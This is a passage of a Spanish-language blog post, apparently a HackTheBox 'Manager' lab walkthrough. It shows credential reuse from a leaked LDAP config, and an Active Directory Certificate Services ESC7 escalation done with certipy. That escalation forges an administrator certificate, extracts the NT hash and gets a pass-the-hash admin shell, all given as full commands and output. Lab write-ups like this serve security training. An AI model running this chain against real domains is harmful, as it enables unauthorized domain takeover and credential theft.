 extracting: images/envelope.png
 extracting: images/envelope-o.png
  inflating: images/hero-bg.jpg
 extracting: images/location.png
 extracting: images/location-o.png
 extracting: images/logo.png
  inflating: images/menu.png
 extracting: images/next.png
 extracting: images/next-white.png
  inflating: images/offer-img.jpg
  inflating: images/prev.png
 extracting: images/prev-white.png
 extracting: images/quote.png
 extracting: images/s-1.png
 extracting: images/s-2.png
 extracting: images/s-3.png
 extracting: images/s-4.png
 extracting: images/search-icon.png
  inflating: index.html
  inflating: js/bootstrap.js
  inflating: js/jquery-3.4.1.min.js
  inflating: service.html
➜  content
</code></pre></div></div>

<h2 id="shell-as-raven">Shell as raven</h2>

<ul>
  <li>Si examinamos el archivo <strong>old-conf.xml</strong> encontramos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> .old-conf.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;ldap-conf xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span><span class="o">&gt;</span>
   &lt;server&gt;
      &lt;host&gt;dc01.manager.htb&lt;/host&gt;
      &lt;open-port <span class="nv">enabled</span><span class="o">=</span><span class="s2">"true"</span><span class="o">&gt;</span>389&lt;/open-port&gt;
      &lt;secure-port <span class="nv">enabled</span><span class="o">=</span><span class="s2">"false"</span><span class="o">&gt;</span>0&lt;/secure-port&gt;
      &lt;search-base&gt;dc<span class="o">=</span>manager,dc<span class="o">=</span>htb&lt;/search-base&gt;
      &lt;server-type&gt;microsoft&lt;/server-type&gt;
      &lt;access-user&gt;
         &lt;user&gt;raven@manager.htb&lt;/user&gt;
         &lt;password&gt;R4v3nBe5tD3veloP3r!123&lt;/password&gt;
      &lt;/access-user&gt;
      &lt;uid-attribute&gt;cn&lt;/uid-attribute&gt;
   &lt;/server&gt;
   &lt;search <span class="nb">type</span><span class="o">=</span><span class="s2">"full"</span><span class="o">&gt;</span>
      &lt;dir-list&gt;
         &lt;<span class="nb">dir</span><span class="o">&gt;</span><span class="nv">cn</span><span class="o">=</span>Operator1,CN<span class="o">=</span><span class="nb">users</span>,dc<span class="o">=</span>manager,dc<span class="o">=</span>htb&lt;/dir&gt;
      &lt;/dir-list&gt;
   &lt;/search&gt;
&lt;/ldap-conf&gt;
</code></pre></div></div>

<ul>
  <li>Vamos a corroborar si podemos conectarnos con <strong>evil-winrm</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec winrm 10.10.11.236 <span class="nt">-u</span> raven <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
SMB         10.10.11.236    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:manager.htb<span class="o">)</span>
HTTP        10.10.11.236    5985   DC01             <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://10.10.11.236:5985/wsman
WINRM       10.10.11.236    5985   DC01             <span class="o">[</span>+] manager.htb<span class="se">\r</span>aven:R4v3nBe5tD3veloP3r!123 <span class="o">(</span>Pwn3d!<span class="o">)</span>
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Nos conectamos y podemos ver la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.11.236 <span class="nt">-u</span> raven <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>aven<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\R</span>aven<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
192acfae62cbf1f9d9db96f43db90f99
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>aven<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>No podemos hacer gran cosa.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\R</span>aven<span class="se">\D</span>ocuments&gt; <span class="nb">whoami</span> /priv

PRIVILEGES INFORMATION
<span class="nt">----------------------</span>

Privilege Name                Description                    State
<span class="o">=============================</span> <span class="o">==============================</span> <span class="o">=======</span>
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="nb">set </span>Enabled
</code></pre></div></div>

<ul>
  <li>Vamos a verificar los <strong>Advice Directory Certificate Services</strong> con la herramienta .</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad find <span class="nt">-dc-ip</span> 10.10.11.236 <span class="nt">-ns</span> 10.10.11.236 <span class="nt">-u</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span> <span class="nt">-vulnerable</span> <span class="nt">-stdout</span>
Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 33 certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 11 enabled certificate templates
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'manager-DC01-CA'</span> via CSRA
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">'manager-DC01-CA'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumeration output:
Certificate Authorities
  0
    CA Name                             : manager-DC01-CA
    DNS Name                            : dc01.manager.htb
    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>manager-DC01-CA, <span class="nv">DC</span><span class="o">=</span>manager, <span class="nv">DC</span><span class="o">=</span>htb
    Certificate Serial Number           : 5150CE6EC048749448C7390A52F264BB
    Certificate Validity Start          : 2023-07-27 10:21:05+00:00
    Certificate Validity End            : 2122-07-27 10:31:04+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption <span class="k">for </span>Requests     : Enabled
    Permissions
      Owner                             : MANAGER.HTB<span class="se">\A</span>dministrators
      Access Rights
        Enroll                          : MANAGER.HTB<span class="se">\O</span>perator
                                          MANAGER.HTB<span class="se">\A</span>uthenticated Users
                                          MANAGER.HTB<span class="se">\R</span>aven
        ManageCa                        : MANAGER.HTB<span class="se">\A</span>dministrators
                                          MANAGER.HTB<span class="se">\D</span>omain Admins
                                          MANAGER.HTB<span class="se">\E</span>nterprise Admins
                                          MANAGER.HTB<span class="se">\R</span>aven
        ManageCertificates              : MANAGER.HTB<span class="se">\A</span>dministrators
                                          MANAGER.HTB<span class="se">\D</span>omain Admins
                                          MANAGER.HTB<span class="se">\E</span>nterprise Admins
    <span class="o">[!]</span> Vulnerabilities
      ESC7                              : <span class="s1">'MANAGER.HTB\\Raven'</span> has dangerous permissions
Certificate Templates                   : <span class="o">[!]</span> Could not find any certificate templates
</code></pre></div></div>

<h2 id="esc7">ESC7</h2>

<ul>
  <li>
    <p>Y bueno ya nos reporta que es vulnerable a <strong>ESC7</strong> esta vulnerabilidad se produce cuando un usuario tiene derechos de acceso elevados sobre el propio servicio de Certificate Authority (CA) o sobre la administración de certificados. En este caso específico, el usuario “Raven” tiene derechos de “ManageCA” (Administrar CA) .</p>
  </li>
  <li>
    <p>Lo primero que vamos a hacer es sincronizarnos con el reloj del dominio.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">sudo </span>ntpdate <span class="nt">-u</span> manager.htb
2024-03-16 19:52:19.262396 <span class="o">(</span><span class="nt">-0600</span><span class="o">)</span> +25200.544784 +/- 0.076829 manager.htb 10.10.11.236 s1 no-leap
CLOCK: <span class="nb">time </span>stepped by 25200.544784
</code></pre></div></div>

<ul>
  <li>Ahora vamos a usar <strong>certipy</strong> necesitamos usar el <strong>Manage CA permission</strong>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad ca <span class="nt">-ca</span> manager-DC01-CA <span class="nt">-add-officer</span> raven <span class="nt">-username</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
</code></pre></div></div>

<ul>
  <li>Vamos a solicitar un certificado, falla, pero tenemos la clave.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad req <span class="nt">-ca</span> manager-DC01-CA <span class="nt">-target</span> dc01.manager.htb <span class="nt">-template</span> SubCA <span class="nt">-upn</span> administrator@manager.htb <span class="nt">-username</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
<span class="o">[</span>-] Got error <span class="k">while </span>trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template <span class="k">do </span>not allow the current user to enroll <span class="k">for </span>this <span class="nb">type </span>of certificate.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 18
Would you like to save the private key? <span class="o">(</span>y/N<span class="o">)</span> y
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved private key to 18.key
<span class="o">[</span>-] Failed to request certificate
</code></pre></div></div>

<ul>
  <li>Ahora vamos a emitir un certificado apartar de la solicitud previamente generada.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad ca <span class="nt">-ca</span> manager-DC01-CA <span class="nt">-issue-request</span> 18 <span class="nt">-username</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully issued certificate
</code></pre></div></div>

<ul>
  <li>Ahora vamos a recuperar el certificado emitido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad req <span class="nt">-ca</span> manager-DC01-CA <span class="nt">-target</span> dc01.manager.htb <span class="nt">-retrieve</span> 18 <span class="nt">-username</span> raven@manager.htb <span class="nt">-p</span> <span class="s1">'R4v3nBe5tD3veloP3r!123'</span>
Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Rerieving certificate with ID 18
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Successfully retrieved certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got certificate with UPN <span class="s1">'administrator@manager.htb'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate has no object SID
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Loaded private key from <span class="s1">'18.key'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved certificate and private key to <span class="s1">'administrator.pfx'</span>
</code></pre></div></div>

<h2 id="shell-as-administrator">Shell as Administrator</h2>

<ul>
  <li>Ahora con este certificado podemos obtener el hash <strong>NTLM</strong> del usuario administrador para esto es muy importante que tu reloj esté previamente sincronizado con la máquina.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 10.10.11.236
Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using principal: administrator@manager.htb
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get TGT...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got TGT 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saved credential cache to <span class="s1">'administrator.ccache'</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to retrieve NT <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator'</span> <span class="o">[</span><span class="k">*</span><span class="o">]</span> Got <span class="nb">hash </span><span class="k">for</span> <span class="s1">'administrator@manager.htb'</span>: aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
</code></pre></div></div>

<ul>
  <li>Ahora nos conectamos ala máquina como administrador.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content evil-winrm <span class="nt">-i</span> 10.10.11.236 <span class="nt">-u</span> administrator <span class="nt">-H</span> ae5064c2f62317332c88629e025924ef

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>manager<span class="se">\a</span>dministrator
<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Vemos la root flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
b6a4acc041a47c288ef5c9a5f085678e
</code></pre></div></div>

  </div><a class="u-url" href="/hackthebox/machines/medium/2024/04/05/manager.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <div class="footer-col-wrapper">
      <div class="footer-col">
        <p class="feed-subscribe">
          <a href="http://localhost:4000/feed.xml">
            <svg class="svg-icon orange">
              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
            </svg><span>Subscribe</span>
          </a>
        </p>
        <ul class="contact-list">
          <li class="p-name">MiguelRega7</li>
          
        </ul>
      </div>
      <div class="footer-col">
        <p>Posts sobre resolución de CTFs y ciberseguridad.
</p>
      </div>
    </div>

    <div class="social-links"><ul class="social-media-list"><li>
  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.instagram.com/_miguelitornuno7" target="_blank" title="instagram">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
    </svg>
  </a>
</li>
<li>
  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
    <svg class="svg-icon grey">
      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
    </svg>
  </a>
</li>
</ul>
</div>

  </div>

</footer>
</body>

</html>
